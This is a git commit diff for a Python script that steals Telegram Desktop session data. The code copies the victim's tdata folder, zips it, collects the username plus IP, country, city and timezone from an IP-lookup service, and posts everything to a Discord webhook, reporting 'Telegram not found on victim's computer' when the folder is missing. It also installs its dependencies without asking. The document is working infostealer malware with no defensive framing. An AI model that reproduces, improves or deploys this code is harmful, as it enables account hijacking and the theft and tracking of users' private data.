18b0867132b4e12fa153b0998031f807a0652d27
David <defaultik.personal@gmail.com>
2024-12-21 22:37:27 +0200

    victim info added; code rewrite

--- source/main.py
+++ source/main.py
@@ -1,54 +1,69 @@
 import os
 import shutil
-import tempfile
+from tempfile import TemporaryDirectory
 from random import choices
 
 try:
     import discord
+    from requests import get
 except ImportError:
     os.system("pip install discord")
     os.system("pip install audioop-lts")
     os.system("pip install requests")
-finally:
     import discord
+    from requests import get
 
 
 DISCORD_WEBHOOK_URL = ""
 
+TELEGRAM_PATH = os.path.join(os.getenv("APPDATA"), "Telegram")
+TEMP_PATH = os.getenv("TEMP")
 
-def steal_telegram():
+
+def random_string(len):
+    return ''.join(choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=len))
+
+
+def send_webhook_message(username, ip_info, file_path=None):
+    content = (
+        "```"
+        f"Username: {username}\n"
+        f"IP: {ip_info['ip']}\n"
+        f"Location: {ip_info['country']}, {ip_info['city']}\n"
+        f"Timezone: {ip_info['timezone']}"
+        "```"
+    )
+
     webhook = discord.SyncWebhook.from_url(DISCORD_WEBHOOK_URL)
 
-    telegram_path = os.path.join(os.getenv("APPDATA"), "Telegram Desktop")
-    if not os.path.exists(telegram_path):
-        raise FileNotFoundError("Telegram not found")
-    
-    for root, dirs, files in os.walk(telegram_path):
-        if "tdata" in dirs and "Telegram.exe" in files:
-            tdata_folder = os.path.join(root, "tdata")
-            break
-        else:
-            raise ImportError("Fake folder")
-
-    
-    with tempfile.TemporaryDirectory() as temp_dir:
-        shutil.copytree(tdata_folder, temp_dir, dirs_exist_ok=True, ignore=shutil.ignore_patterns("working", "user_data", "user_data#2", "emoji", "dumps", "tdummy", "temp"))
-
-        archieve_dir = os.path.join(os.getenv("TEMP"), random_string())
-        shutil.make_archive(archieve_dir, "zip", temp_dir)
-
-    webhook.send(file=discord.File(archieve_dir + ".zip"))
-    os.remove(archieve_dir + ".zip")
-
-
-def random_string():
-    return ''.join(choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=6))
+    if file_path:
+        webhook.send(content=content, file=discord.File(file_path))
+    else:
+        webhook.send(content=content + "```Telegram not found on victim's computer```")
 
 
 def main():
-    print("In process...")
-    steal_telegram()
-    print("Success!")
+    username = os.getlogin()
+    ip_info = get("https://ipwhois.app/json/").json()
+
+    if not os.path.exists(TELEGRAM_PATH):
+        send_webhook_message(username, ip_info)
+        return
+    
+    tdata_folder = os.path.join(TELEGRAM_PATH, "tdata")
+
+    with TemporaryDirectory() as temp:
+        shutil.copytree(
+            tdata_folder, temp, dirs_exist_ok=True,
+            ignore=shutil.ignore_patterns("working", "user_data", "user_data#2", "emoji", "dumps", "tdummy", "temp")
+        )
+
+        archive_dir = os.path.join(TEMP_PATH, random_string(6))
+        shutil.make_archive(archive_dir, "zip", temp)
+
+        send_webhook_message(username, ip_info, file_path=f"{archive_dir}.zip")
+
+    os.remove(f"{archive_dir}.zip")
 
 
 if __name__ == "__main__":
